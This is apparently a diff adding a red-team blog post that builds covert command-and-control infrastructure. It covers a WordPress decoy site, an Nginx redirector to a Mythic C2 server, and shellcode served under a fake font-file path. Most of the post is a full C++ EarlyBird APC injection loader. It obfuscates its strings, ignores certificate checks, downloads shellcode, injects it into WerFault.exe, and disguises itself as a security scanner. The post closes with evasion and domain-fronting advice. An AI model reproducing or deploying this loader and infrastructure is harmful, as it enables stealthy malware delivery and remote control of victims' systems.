+        define('WP_SITEURL', 'https://$DOMAIN');
+    volumes:
+      - wordpress_data:/var/www/html
+    depends_on:
+      - db
+
+  db:
+    image: mysql:5.7
+    restart: always
+    environment:
+      MYSQL_DATABASE: wordpress
+      MYSQL_USER: wordpress
+      MYSQL_PASSWORD: wordpress
+      MYSQL_ROOT_PASSWORD: root
+    volumes:
+      - db_data:/var/lib/mysql
+
+volumes:
+  wordpress_data:
+  db_data:
+EOF
+
+cd "$PROJECT_DIR"
+docker compose down -v
+docker compose up -d
+</code></pre>
+<p>This creates a fully functional WordPress site running on localhost port 8000. The WordPress configuration forces HTTPS URLs, which is important for maintaining our SSL facade.</p>
+<h3>The Nginx Redirector Configuration</h3>
+<p>Here's where the magic happens. Our Nginx configuration serves three different purposes depending on which subdomain is accessed:</p>
+<pre class="language-nginx"><code class="language-nginx"># /etc/nginx/sites-available/example-business
+
+# Legitimate decoy site
+server {
+    listen 443 ssl;
+    server_name www.example-business.com;
+    client_max_body_size 64M;
+    ssl_certificate /etc/letsencrypt/live/www.example-business.com/fullchain.pem;
+    ssl_certificate_key /etc/letsencrypt/live/www.example-business.com/privkey.pem;
+    include /etc/letsencrypt/options-ssl-nginx.conf;
+    ssl_dhparam /etc/letsencrypt/ssl-dhparams.pem;
+
+    location / {
+        proxy_pass http://127.0.0.1:8000; # WordPress container running locally
+        proxy_set_header Host $host;
+        proxy_set_header X-Real-IP $remote_addr;
+        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
+        proxy_set_header X-Forwarded-Proto https;
+    }
+}
+
+# Mythic C2 reverse proxy
+server {
+    listen 443 ssl;
+    server_name api.example-business.com;
+
+    ssl_certificate /etc/letsencrypt/live/www.example-business.com/fullchain.pem;
+    ssl_certificate_key /etc/letsencrypt/live/www.example-business.com/privkey.pem;
+    include /etc/letsencrypt/options-ssl-nginx.conf;
+    ssl_dhparam /etc/letsencrypt/ssl-dhparams.pem;
+
+    location / {
+        proxy_pass http://10.0.0.2:80;
+        proxy_ssl_verify off;
+        proxy_set_header Host $host;
+        proxy_set_header X-Real-IP $remote_addr;
+        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
+    }
+}
+
+# Optional file hosting (e.g., for staging payloads)
+server {
+    listen 443 ssl;
+    server_name dl.example-business.com;
+
+    ssl_certificate /etc/letsencrypt/live/www.example-business.com/fullchain.pem;
+    ssl_certificate_key /etc/letsencrypt/live/www.example-business.com/privkey.pem;
+    include /etc/letsencrypt/options-ssl-nginx.conf;
+    ssl_dhparam /etc/letsencrypt/ssl-dhparams.pem;
+
+    location /assets/fonts/manrope-light.ttf {
+        proxy_pass https://10.0.0.2:7443/direct/download/01fd417f-95e3-42dd-a26c-98d5262ac37d;
+        proxy_ssl_verify off;
+        proxy_set_header Host $host;
+        proxy_set_header X-Real-IP $remote_addr;
+        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
+
+        # Optional headers to simulate legit service
+        proxy_hide_header Content-Disposition;
+        add_header Content-Type "application/font-ttf";
+        add_header X-Powered-By "PHP/8.1.9";
+        add_header Server "cloudflare";
+    }
+}
+
+# Redirect all HTTP traffic to HTTPS
+server {
+    listen 80;
+    server_name www.example-business.com;
+    return 301 https://$host$request_uri;
+}
+
+server {
+    listen 80;
+    server_name api.example-business.com dl.example-business.com;
+    return 301 https://$host$request_uri;
+}
+</code></pre>
+<p>The configuration creates three distinct services that work together. The main decoy site at www.example-business.com proxies all traffic to our WordPress container, so anyone visiting the main domain sees a legitimate business website. This is your front-facing presence that provides cover for the real infrastructure.</p>
+<p>The C2 communications happen through api.example-business.com, which is where the real magic occurs. All traffic to this subdomain gets forwarded directly to our Mythic server on the internal network. Our implants will connect here, but to external observers it just looks like API calls to a business service.</p>
+<p>For payload hosting, dl.example-business.com handles the actual malware downloads. The specific path <code>/assets/fonts/manrope-light.ttf</code> looks like a legitimate web font file, but it's actually serving our shellcode from Mythic's file hosting service. The font file disguise is particularly effective because font downloads are extremely common and rarely scrutinized.</p>
+<p>Everything gets redirected to HTTPS automatically, which maintains our legitimate appearance while also encrypting all the actual C2 traffic flowing through the infrastructure.</p>
+<p>The beauty of this setup is that each subdomain serves a different purpose, but they all use the same SSL certificate and appear to be part of the same legitimate website infrastructure.</p>
+<p>For detailed implementation guides and advanced redirector architectures, see my in-depth article on <a href="https://xbz0n.sh/blog/c2-redirectors">C2 Redirector Techniques</a>.</p>
+<h3>Why This Redirector Design Works</h3>
+<p>The key insight here is that we're not just hiding our C2 traffic - we're making it look completely legitimate. Here's why this approach is so effective:</p>
+<p><strong>Legitimate SSL Certificates</strong>: We're using real certificates from Let's Encrypt, not self-signed ones that security tools flag.</p>
+<p><strong>Realistic URL Patterns</strong>: The font file path looks exactly like something you'd see on any modern website.</p>
+<p><strong>Proper HTTP Headers</strong>: We're adding headers that make our responses look like they're coming from a real CDN or web server.</p>
+<p><strong>Multiple Service Simulation</strong>: By having different subdomains for different purposes, we simulate how real companies structure their web infrastructure.</p>
+<p><strong>No Direct C2 Exposure</strong>: Our actual Mythic server is designed to be completely hidden from the internet. All external C2 and payload traffic gets shunted exclusively through the redirector, which then proxies those connections back to our internal Mythic server.</p>
+<h2>Part 3: Generating and Hosting the Payload</h2>
+<p>With our infrastructure ready, we need to generate a payload and make it available through our redirector. Mythic makes this straightforward.</p>
+<h3>Creating the Apollo Payload</h3>
+<p>In the Mythic web interface, we create a new payload with these settings:</p>
+<ul>
+<li><strong>Agent</strong>: Apollo</li>
+<li><strong>C2 Profile</strong>: HTTP</li>
+<li><strong>Callback Host</strong>: <code>api.example-business.com</code></li>
+<li><strong>Callback Port</strong>: 443</li>
+<li><strong>Output Format</strong>: Shellcode</li>
+</ul>
+<p>The generated shellcode gets a unique identifier like <code>01fd417f-95e3-42dd-a26c-98d5262ac37d</code> and becomes available at:
+<code>https://10.0.0.2:7443/direct/download/01fd417f-95e3-42dd-a26c-98d5262ac37d</code></p>
+<h3>The Redirector Magic</h3>
+<p>Here's where our redirector configuration pays off. Thanks to our Nginx setup, this payload is now accessible at:
+<code>https://dl.example-business.com/assets/fonts/manrope-light.ttf</code></p>
+<p>To anyone monitoring network traffic, this looks like a normal request for a web font file. The Content-Type header says it's a font, the URL looks legitimate, and it's served over HTTPS from what appears to be a business website.</p>
+<p>But in reality, it's serving our Apollo shellcode that will establish a connection back to our C2 infrastructure.</p>
+<h2>Part 4: The EarlyBird Injection Loader</h2>
+<p>Now we need a way to execute our payload on target systems. This is where our custom loader comes in. The loader implements the EarlyBird injection technique, which is particularly effective because it injects code before the target process fully initializes.</p>
+<h3>Understanding EarlyBird Injection</h3>
+<p>EarlyBird injection is a process injection technique that takes advantage of the Windows process creation workflow. Here's how it works:</p>
+<ol>
+<li><strong>Create Suspended Process</strong>: We create a new process in a suspended state using the <code>CREATE_SUSPENDED</code> flag.</li>
+<li><strong>Allocate Memory</strong>: While the process is suspended, we allocate memory in its address space.</li>
+<li><strong>Write Payload</strong>: We write our shellcode to the allocated memory.</li>
+<li><strong>Queue APC</strong>: We use <code>QueueUserAPC</code> to queue an Asynchronous Procedure Call that points to our shellcode.</li>
+<li><strong>Resume Process</strong>: When we resume the process, the APC executes our code before the main thread starts.</li>
+</ol>
+<p>The beauty of this technique is timing. Most EDR solutions monitor process creation and memory allocation, but EarlyBird happens during the natural process initialization phase, making it much harder to detect.</p>
+<h3>The Complete Loader Implementation</h3>
+<p>Let me walk through the actual loader code and explain exactly how it works. This is a well-crafted C++ application that implements EarlyBird injection with multiple evasion techniques:</p>
+<pre class="language-cpp"><code class="language-cpp">#include &#x3C;Windows.h>
+#include &#x3C;winternl.h>
+#include &#x3C;winhttp.h>
+#include &#x3C;iostream>
+#include &#x3C;vector>
+#include &#x3C;random>
+#include &#x3C;thread>
+#include &#x3C;chrono>
+#include &#x3C;string>
+#include &#x3C;array>
+#include &#x3C;intrin.h>
+#include &#x3C;sstream>
+#include &#x3C;iomanip>
+#include &#x3C;TlHelp32.h>
+#include &#x3C;ktmw32.h>
+#include &#x3C;map>
+
+#pragma comment(lib, "winhttp.lib")
+#pragma comment(lib, "ntdll.lib")
+#pragma comment(lib, "ktmw32.lib")
+#pragma comment(lib, "advapi32.lib")
+#pragma comment(lib, "user32.lib")
+
+#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)
+#define LOG(msg) std::cout &#x3C;&#x3C; "[+] " &#x3C;&#x3C; msg &#x3C;&#x3C; std::endl
+#define LOG_ERROR(msg) std::cerr &#x3C;&#x3C; "[-] " &#x3C;&#x3C; msg &#x3C;&#x3C; std::endl
+#define LOG_WARNING(msg) std::cout &#x3C;&#x3C; "[!] " &#x3C;&#x3C; msg &#x3C;&#x3C; std::endl
+</code></pre>
+<p>The includes and pragmas set up everything we need. Windows.h gives us the core Windows API functions for process manipulation, while winternl.h provides access to internal Windows structures and undocumented APIs that aren't in the standard headers.</p>
+<p>We need winhttp.h for HTTP client functionality to download our payloads, and TlHelp32.h for process enumeration and manipulation. The ktmw32.h header is for Kernel Transaction Manager operations, though we don't use those features in this particular loader.</p>
+<p>The pragma comments link against the necessary libraries at compile time, which is crucial because we're using APIs from multiple Windows subsystems. Without these, the linker wouldn't know where to find the functions we're calling.</p>
+<h3>Understanding the Loader Architecture</h3>
+<p>Before diving into the code, let's understand what makes this loader special. Most basic process injectors follow a simple pattern: allocate memory, write shellcode, create thread. Our loader is different because it implements multiple layers of protection and evasion that work together.</p>
+<p>Instead of embedding payloads directly in the binary, we download them at runtime with multiple fallback mechanisms. This keeps the initial loader small and makes it harder for static analysis tools to detect malicious code. The loader uses random delays and realistic HTTP patterns to make network traffic look legitimate rather than automated.</p>
+<p>For anti-analysis protection, we use string obfuscation and runtime decryption to prevent static analysis tools from easily identifying what the loader is trying to do. The process selection logic picks targets based on what's actually running on the system rather than hardcoding a specific process name.</p>
+<p>Most importantly, the EarlyBird injection technique executes our code during process initialization rather than after the process is already running. This timing makes it much harder for EDR systems to detect because our code runs before most monitoring hooks are in place.</p>
+<h3>XOR Encryption for Embedded Payload</h3>
+<p>The loader includes a simple XOR encryption function for the embedded fallback payload:</p>
+<pre class="language-cpp"><code class="language-cpp">    // XOR encryption/decryption
+    void XorCrypt(std::vector&#x3C;BYTE>&#x26; data, const std::vector&#x3C;BYTE>&#x26; key) {
+        for (size_t i = 0; i &#x3C; data.size(); i++) {
+            data[i] ^= key[i % key.size()];
+        }
+    }
+</code></pre>
+<p>This XOR encryption is primarily for the embedded fallback payload, ensuring it's not plaintext in the binary if network downloads fail. The primary downloaded payload from Mythic, transmitted over HTTPS, does not undergo additional XOR decryption by the loader.</p>
+<p>This implements a repeating-key XOR cipher. While XOR isn't cryptographically secure, it's perfect for this use case. XOR operations are extremely fast, adding minimal overhead to the loader. There's no complex key schedules or initialization vectors to worry about, and the same operation encrypts and decrypts. Most importantly, many EDR systems don't flag XOR operations as suspicious since they're used in legitimate software all the time.</p>
+<p>The key repeats across the data length using modulo arithmetic. This provides basic obfuscation for the embedded payload without adding complexity to the loader.</p>
+<h3>String Obfuscation</h3>
+<p>Now the loader implements a clever compile-time string obfuscation system to hide sensitive strings from static analysis:</p>
+<pre class="language-cpp"><code class="language-cpp">// String obfuscation
+#define XOR_KEY 0x42
+template&#x3C;int N>
+struct ObfuscatedString {
+    char data[N];
+    constexpr ObfuscatedString(const char(&#x26;str)[N]) {
+        for (int i = 0; i &#x3C; N; i++) {
+            data[i] = str[i] ^ XOR_KEY;
+        }
+    }
+    
+    std::string decrypt() const {
+        std::string result;
+        for (int i = 0; i &#x3C; N - 1; i++) {
+            result += (data[i] ^ XOR_KEY);
+        }
+        return result;
+    }
+};
+
+#define OBFSTR(str) (ObfuscatedString&#x3C;sizeof(str)>(str).decrypt())
+</code></pre>
+<p>This works because the encryption happens at compile time rather than runtime. The constexpr constructor means the XOR encryption occurs when the code is compiled, not when it executes. The strings get stored encrypted in the binary and are only decrypted when actually needed. Static analysis tools scanning the executable won't find your target URLs or other sensitive strings in plaintext.</p>
+<p>The OBFSTR macro makes this easy to use throughout the code - you just wrap any string with it and the obfuscation happens automatically.</p>
+<h3>The Main Loader Class</h3>
+<p>The loader is built around a single class that encapsulates all the functionality:</p>
+<pre class="language-cpp"><code class="language-cpp">class AdvancedPayloadLoader {
+private:
+    std::vector&#x3C;BYTE> payload;
+    std::mt19937 rng;
+    
+    // Simplified stealth configuration
+    struct StealthConfig {
+        bool useJitteredSleep = true;
+    } stealthConfig;
+</code></pre>
+<p>The design is clean and focused. The payload vector stores the downloaded shellcode, while the random number generator provides randomization for evasion techniques. The StealthConfig struct controls behavioral features like jittered sleep timing. This keeps the loader lightweight while still providing the necessary evasion capabilities.</p>
+<h3>Jittered Sleep for Evasion</h3>
+<p>The loader implements smart timing evasion through jittered sleep:</p>
+<pre class="language-cpp"><code class="language-cpp">    // Jittered sleep for evasion
+    void JitteredSleep(DWORD minMs, DWORD maxMs) {
+        std::uniform_int_distribution&#x3C;DWORD> dist(minMs, maxMs);
+        DWORD sleepTime = dist(rng);
+        Sleep(sleepTime);
+    }
+</code></pre>
+<p>This is a simple but effective evasion technique. Instead of predictable delays that behavioral analysis tools can detect, we use random intervals within a specified range. This makes the loader's timing patterns look more like legitimate software that might pause for user interaction or system resources.</p>
+<p>The uniform distribution ensures the delays are truly random within the specified bounds, breaking up any timing signatures that security tools might look for.</p>
+<h3>EarlyBird Injection Implementation</h3>
+<p>The EarlyBird injection is the core technique that makes this loader effective against modern defenses:</p>
+<pre class="language-cpp"><code class="language-cpp">    // Early Bird APC Queue Injection
+    bool EarlyBirdInjection(const std::wstring&#x26; targetPath) {
+        LOG("Starting EarlyBird injection on " + std::string(targetPath.begin(), targetPath.end()));
+        
+        STARTUPINFOW si = { sizeof(si) };
+        PROCESS_INFORMATION pi = {};
+        si.dwFlags = STARTF_USESHOWWINDOW;
+        si.wShowWindow = SW_HIDE;
+        
+        if (!CreateProcessW(targetPath.c_str(), NULL, NULL, NULL, FALSE,
+            CREATE_SUSPENDED, NULL, NULL, &#x26;si, &#x26;pi)) {
+            LOG_ERROR("Failed to create suspended process");
+            return false;
+        }
+        
+        LOG("Created suspended process (PID: " + std::to_string(pi.dwProcessId) + ")");
+
+        LPVOID pRemoteMemory = VirtualAllocEx(pi.hProcess, NULL, payload.size(),
+            MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+        
+        if (!pRemoteMemory) {
+            LOG_ERROR("Failed to allocate memory");
+            TerminateProcess(pi.hProcess, 0);
+            CloseHandle(pi.hProcess);
+            CloseHandle(pi.hThread);
+            return false;
+        }
+        
+        SIZE_T bytesWritten;
+        if (!WriteProcessMemory(pi.hProcess, pRemoteMemory, payload.data(), payload.size(), &#x26;bytesWritten)) {
+            LOG_ERROR("Failed to write memory");
+            VirtualFreeEx(pi.hProcess, pRemoteMemory, 0, MEM_RELEASE);
+            TerminateProcess(pi.hProcess, 0);
+            CloseHandle(pi.hProcess);
+            CloseHandle(pi.hThread);
+            return false;
+        }
+
+        QueueUserAPC((PAPCFUNC)pRemoteMemory, pi.hThread, 0);
+        
+        ResumeThread(pi.hThread);
+        return true;
+    }
+</code></pre>
+<p>The technique works by creating a process in a suspended state using CreateProcessW with the CREATE_SUSPENDED flag. This creates the process but doesn't start the main thread, giving us time to inject our code. We then use VirtualAllocEx to allocate memory in the target process with execute permissions and WriteProcessMemory to write our shellcode to that allocated memory.</p>
+<p>The key is QueueUserAPC, which adds our shellcode to the thread's APC queue. When we call ResumeThread to start the process, Windows checks if the thread has any queued APCs and executes them before starting the thread's main function. This means our shellcode executes before the legitimate process code, giving us control from the very beginning of the process lifecycle.</p>
+<p>WerFault.exe (Windows Error Reporting) is an ideal injection target because it's a legitimate system process that runs regularly, has network access for sending error reports to Microsoft, and is less likely to be monitored than other system processes.</p>
+<h3>The Download System Deep Dive</h3>
+<p>The loader implements a sophisticated multi-tier download system with realistic HTTP behavior:</p>
+<pre class="language-cpp"><code class="language-cpp">    // Enhanced HTTPS download with full fallback system
+    bool DownloadPayload() {
+        LOG("Initiating payload download with 2-tier fallback system");
+        
+        // Primary URL (your original payload server)
+        std::string primaryHost = OBFSTR("dl.example-business.com");
+        std::string primaryPath = OBFSTR("/assets/fonts/manrope-light.ttf");
+        
+        // Fallback URL (Google Fonts for stealth)
+        std::string fallbackHost = OBFSTR("fonts.googleapis.com");
+        std::string fallbackPath = OBFSTR("/css2?family=Open+Sans:wght@300;400;600;700&#x26;display=swap");
+        
+        // Try primary URL first
+        LOG("Attempting download from primary server...");
+        if (AttemptDownload(primaryHost, primaryPath)) {
+            LOG("Primary download successful");
+            return true;
+        }
+        
+        LOG("Primary download failed, trying fallback server...");
+        JitteredSleep(2000, 4000);
+        
+        // Try fallback URL
+        if (AttemptDownload(fallbackHost, fallbackPath)) {
+            LOG("Fallback download successful");
+            return true;
+        }
+        
+        LOG("All download attempts failed");
+        return false;
+    }
+</code></pre>
+<p>This is clever operational planning. The primary target is your redirector serving the real payload, but if that fails, the loader tries to download from Google Fonts. Obviously Google won't serve your payload, but this maintains the illusion that the loader is just trying to download legitimate web resources.</p>
+<p>The obfuscated strings prevent static analysis from revealing your infrastructure, and the jittered sleep between attempts makes the retry behavior look natural.</p>
+<p>Now let's look at the complete <code>AttemptDownload</code> method with all the WinHTTP setup and response handling:</p>
+<pre class="language-cpp"><code class="language-cpp">    bool AttemptDownload(const std::string&#x26; host, const std::string&#x26; path) {
+        LOG("Initializing download from " + host);
+        std::wstring wHost(host.begin(), host.end());
+        std::wstring wPath(path.begin(), path.end());
+        
+        // Rotate User-Agents for stealth
+        std::vector&#x3C;std::wstring> userAgents = {
+            L"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
+            L"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
+            L"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/120.0.0.0 Safari/537.36"
+        };
+        
+        std::uniform_int_distribution&#x3C;size_t> uaDist(0, userAgents.size() - 1);
+        std::wstring selectedUA = userAgents[uaDist(rng)];
+        
+        HINTERNET hSession = WinHttpOpen(selectedUA.c_str(),
+            WINHTTP_ACCESS_TYPE_NO_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
+        if (!hSession) return false;
+        
+        HINTERNET hConnect = WinHttpConnect(hSession, wHost.c_str(), INTERNET_DEFAULT_HTTPS_PORT, 0);
+        if (!hConnect) {
+            WinHttpCloseHandle(hSession);
+            return false;
+        }
+        
+        HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"GET", wPath.c_str(), NULL,
+            WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, WINHTTP_FLAG_SECURE);
+        if (!hRequest) {
+            WinHttpCloseHandle(hConnect);
+            WinHttpCloseHandle(hSession);
+            return false;
+        }
+        
+        // Certificate bypass and realistic headers
+        DWORD dwSecurityFlags = SECURITY_FLAG_IGNORE_CERT_CN_INVALID |
+            SECURITY_FLAG_IGNORE_CERT_DATE_INVALID | SECURITY_FLAG_IGNORE_UNKNOWN_CA |
+            SECURITY_FLAG_IGNORE_CERT_WRONG_USAGE;
+        WinHttpSetOption(hRequest, WINHTTP_OPTION_SECURITY_FLAGS, &#x26;dwSecurityFlags, sizeof(dwSecurityFlags));
+        
+        WinHttpAddRequestHeaders(hRequest, L"Accept: text/css,*/*;q=0.1", -1, WINHTTP_ADDREQ_FLAG_ADD);
+        WinHttpAddRequestHeaders(hRequest, L"Accept-Language: en-US,en;q=0.9", -1, WINHTTP_ADDREQ_FLAG_ADD);
+        WinHttpAddRequestHeaders(hRequest, L"Cache-Control: no-cache", -1, WINHTTP_ADDREQ_FLAG_ADD);
+        
+        JitteredSleep(1000, 3000);
+        
+        if (!WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0,
+            WINHTTP_NO_REQUEST_DATA, 0, 0, 0) || !WinHttpReceiveResponse(hRequest, NULL)) {
+            WinHttpCloseHandle(hRequest);
+            WinHttpCloseHandle(hConnect);
+            WinHttpCloseHandle(hSession);
+            return false;
+        }
+        
+        // Read response
+        std::vector&#x3C;BYTE> downloadData;
+        DWORD dwSize = 0;
+        do {
+            DWORD dwDownloaded = 0;
+            if (WinHttpQueryDataAvailable(hRequest, &#x26;dwSize) &#x26;&#x26; dwSize > 0) {
+                std::vector&#x3C;BYTE> buffer(dwSize);
+                if (WinHttpReadData(hRequest, buffer.data(), dwSize, &#x26;dwDownloaded)) {
+                    downloadData.insert(downloadData.end(), buffer.begin(), buffer.begin() + dwDownloaded);
+                }
+            }
+        } while (dwSize > 0);
+        
+        WinHttpCloseHandle(hRequest);
+        WinHttpCloseHandle(hConnect);
+        WinHttpCloseHandle(hSession);
+        
+        if (!downloadData.empty()) {
+            LOG("Downloaded " + std::to_string(downloadData.size()) + " bytes");
+            payload = downloadData; // Payload is downloaded directly over HTTPS; no additional XOR decryption is applied here.
+            LOG("Payload ready (no decryption needed)");
+            return true;
+        }
+        
+        return false;
+    }
+</code></pre>
+<p>This shows the complete HTTP download flow. The WinHTTP session setup creates session, connection, and request handles with proper error checking and cleanup at each step. The security flags are configured to ignore various certificate validation issues, such as invalid common names or expired dates. While this simplifies the download process and allows for the use of self-signed or expired certificates in controlled testing environments, it is a significant OPSEC drawback in real-world red team operations. Advanced network security tools and SOCs can easily flag the use of these bypass flags as suspicious, as legitimate software rarely ignores such critical security checks. For true operational stealth, all certificates should be valid and properly configured.</p>
+<p>The Accept headers make the request look like a browser requesting a CSS or font file rather than suspicious automated traffic. There's a random jittered sleep before sending the request to avoid timing signatures that behavioral analysis tools might detect.</p>
+<p>The response reading loop uses WinHttpQueryDataAvailable and WinHttpReadData to read the response in chunks, accumulating all the data. Once we have the complete payload, it's ready to execute directly without additional decryption since it was already protected by the HTTPS transport.</p>
+<h3>The Execute Method</h3>
+<p>The <strong>Execute</strong> method orchestrates the complete loader workflow:</p>
+<pre class="language-cpp"><code class="language-cpp">    bool Execute() {
+        LOG("========================================");
+        LOG("  Testing EarlyBird Injection Technique against W11");
+        LOG("========================================");
+        
+        JitteredSleep(3000, 7000);
+        
+        // Try to download payload
+        bool downloadSuccess = DownloadPayload();
+        if (!downloadSuccess) {
+            LOG("Using embedded fallback payload");
+            payload = GetEmbeddedPayload();
+            if (payload.empty()) {
+                LOG_ERROR("No payload available");
+                return false;
+            }
+        }
+        
+        // Test EarlyBirdInjection on WerFault.exe
+        std::vector&#x3C;std::wstring> targets = {
+            L"C:\\Windows\\System32\\WerFault.exe"  // Windows Error Reporting
+        };
+        
+        bool success = false;
+        
+        for (const auto&#x26; target : targets) {
+            std::string targetStr(target.begin(), target.end());
+            LOG("Testing EarlyBirdInjection on target: " + targetStr);
+            
+            if (EarlyBirdInjection(target)) {
+                success = true;
+                LOG("Injection succeeded on " + targetStr);
+            } else {
+                LOG_ERROR("Injection failed on " + targetStr);
+            }
+        }
+        
+        return success;
+    }
+</code></pre>
+<p>The execution flow starts with an initial jittered delay to avoid looking like automated malware. It then attempts to download the payload from the C2 infrastructure, but falls back to an embedded payload if the download fails for any reason. Once we have a payload, it injects into WerFault.exe using the EarlyBird technique and returns a success or failure status.</p>
+<p>The GetEmbeddedPayload method provides a fallback when network access fails:</p>
+<pre class="language-cpp"><code class="language-cpp">    std::vector&#x3C;BYTE> GetEmbeddedPayload() {
+        LOG("Loading embedded fallback payload");
+        // Simple calc.exe shellcode (example)
+        std::vector&#x3C;BYTE> embedded = {
+            0x48, 0x31, 0xc9, 0x48, 0x81, 0xe9, 0xc6, 0xff, 0xff, 0xff,
+            0x48, 0x8d, 0x05, 0xef, 0xff, 0xff, 0xff, 0x48, 0xbb, 0x7c,
+            0x21, 0x41, 0x5e, 0xe2, 0xb5, 0xfe, 0xa0, 0x48, 0x31, 0x58,
+            0x27, 0x48, 0x2d, 0xf8, 0xff, 0xff, 0xff, 0xe2, 0xf4
+        };
+        
+        std::vector&#x3C;BYTE> key = { 0xDE, 0xAD, 0xBE, 0xEF, 0xCA, 0xFE, 0xBA, 0xBE };
+        XorCrypt(embedded, key);
+        return embedded;
+    }
+</code></pre>
+<p>This GetEmbeddedPayload method provides a basic calc.exe shellcode, purely as a demonstrative fallback example. In real-world operations, you'd typically embed a lightweight Apollo beacon here, designed to establish initial contact and then pull down the full, more capable payload from your C2 infrastructure.</p>
+<h3>The Main Entry Point</h3>
+<p>The main function and class structure keep things clean:</p>
+<pre class="language-cpp"><code class="language-cpp">public:
+    AdvancedPayloadLoader() : rng(std::random_device{}()) {}
+
+    int Run() {
+        SetConsoleTitleA(OBFSTR("Microsoft Windows Advanced Security Scanner").c_str());
+        // In a production build, console logging (LOG and LOG_ERROR) would typically be removed
+		// or redirected to avoid leaving traces on the target system.
+        //
+        //It's crucial to note that while the provided code includes console logging (via LOG and LOG_ERROR macros) for demonstration and debugging, this logging must be removed or redirected in a true operational scenario. Leaving console output active provides easy traces for defenders on a target system, severely compromising the loader's stealth.
+        try {
+            bool result = Execute();
+            
+            if (result) {
+                LOG("========================================");
+                LOG("  MISSION ACCOMPLISHED!");
+                LOG("========================================");
+            } else {
+                LOG_ERROR("Mission failed");
+            }
+            
+            return result ? 0 : 1;
+        }
+        catch (...) {
+            LOG_ERROR("Unhandled exception occurred");
+            return 1;
+        }
+    }
+};
+
+int main() {
+    AdvancedPayloadLoader loader;
+    return loader.Run();
+}
+</code></pre>
+<p>The obfuscated console title makes the loader look like a legitimate security tool if someone sees it running. The exception handling ensures clean exit even if something goes wrong.</p>
+<h2>Part 5: Putting It All Together</h2>
+<p>The complete execution flow looks like this:</p>
+<ol>
+<li>
+<p><strong>Loader Starts</strong>: Our compiled executable starts and initializes its stealth features.</p>
+</li>
+<li>
+<p><strong>Download Attempt</strong>: It tries to download the payload from <code>dl.example-business.com/assets/fonts/manrope-light.ttf</code>.</p>
+</li>
+<li>
+<p><strong>Redirector Forwards</strong>: Our Nginx redirector receives the request and forwards it to the Mythic server.</p>
+</li>
+<li>
+<p><strong>Payload Retrieved</strong>: The Apollo shellcode is downloaded and stored in memory.</p>
+</li>
+<li>
+<p><strong>Process Creation</strong>: A suspended WerFault.exe process is created.</p>
+</li>
+<li>
+<p><strong>Memory Injection</strong>: The shellcode is written to the process memory.</p>
+</li>
+<li>
+<p><strong>APC Queue</strong>: An APC is queued to execute our code.</p>
+</li>
+<li>
+<p><strong>Process Resume</strong>: The process resumes and our shellcode executes.</p>
+</li>
+<li>
+<p><strong>C2 Connection</strong>: The Apollo agent connects back to <code>api.example-business.com</code>.</p>
+</li>
+<li>
+<p><strong>Redirector Forwards</strong>: Our redirector forwards the C2 traffic to the Mythic server.</p>
+</li>
+<li>
+<p><strong>Session Established</strong>: We now have a live session in the Mythic interface.</p>
+</li>
+</ol>
+<h2>Part 6: OPSEC Considerations</h2>
+<h3>Basic vs. Advanced OPSEC</h3>
+<p>While the techniques described here significantly enhance operational security compared to direct C2 connections or dropping files, it's important to differentiate between foundational OPSEC and highly advanced tradecraft.</p>
+<p>For example, relying on basic SSL certificate bypass flags (<code>SECURITY_FLAG_IGNORE_...</code>) in your loader, while functional for demonstrating the principle, is a strong indicator to advanced network security tools and security operations centers (SOCs). In real-world, high-stakes scenarios, significant effort is placed on ensuring <em>all</em> components exhibit entirely legitimate behavior, including strict adherence to valid and properly configured SSL certificates, to avoid leaving even subtle traces or triggering automated alerts. The goal is to be indistinguishable from normal, legitimate traffic.</p>
+<p>This setup includes several important operational security features:</p>
+<h3>Traffic Analysis Resistance</h3>
+<p>All our C2 traffic flows through legitimate-looking HTTPS connections. Network monitoring tools see:</p>
+<ul>
+<li>Normal WordPress traffic to www.example-business.com</li>
+<li>API calls to api.example-business.com (looks like a business API)</li>
+<li>Font downloads from dl.example-business.com</li>
+</ul>
+<p>Nothing looks suspicious at the network level.</p>
+<h3>Process Injection Stealth</h3>
+<p>EarlyBird injection is particularly stealthy because:</p>
+<ul>
+<li>It doesn't create new processes that might trigger alerts</li>
+<li>The injection happens during normal process initialization</li>
+<li>The target process (WerFault.exe) is expected to run periodically</li>
+<li>The injected payload itself doesn't touch the disk; it lives and breathes entirely in memory, thanks to our loader.</li>
+</ul>
+<h3>String Obfuscation</h3>
+<p>Our compile-time string obfuscation prevents static analysis tools from easily identifying:</p>
+<ul>
+<li>Target URLs</li>
+<li>Process names</li>
+<li>Suspicious API calls</li>
+</ul>
+<h3>Behavioral Evasion</h3>
+<p>The jittered sleep patterns and realistic HTTP headers make our loader behave more like legitimate software than malware.</p>
+<h2>Part 7: Advanced Operational Techniques and Further Considerations</h2>
+<p>Once you have this foundational infrastructure running, there are several ways to enhance its stealth and resilience. These techniques build upon the principles demonstrated earlier:</p>
+<h3>Domain Categorization</h3>
+<p>Register your domains well in advance and get them categorized by web filtering services. A domain categorized as "Business" or "Technology" is much less likely to be blocked than an uncategorized one.</p>
+<h3>CDN Integration and True Domain Fronting</h3>
+<p>Consider putting your redirectors behind a Content Delivery Network (CDN) like Cloudflare, AWS CloudFront, or Google Cloud CDN. This adds another layer of protection by masking your actual redirector IP and can enable <strong>true domain fronting</strong>. True domain fronting occurs when the <code>Host</code> header sent to the CDN (which the CDN uses to route your request) is different from the <code>Host</code> header seen by the CDN's edge server from the client (which typically points to a legitimate high-reputation domain). This allows your C2 traffic to blend in with legitimate traffic directed to a well-known service, hiding your actual C2 domain from network monitoring until it hits the CDN's internal routing.</p>
+<h3>Multiple Redirector Chains</h3>
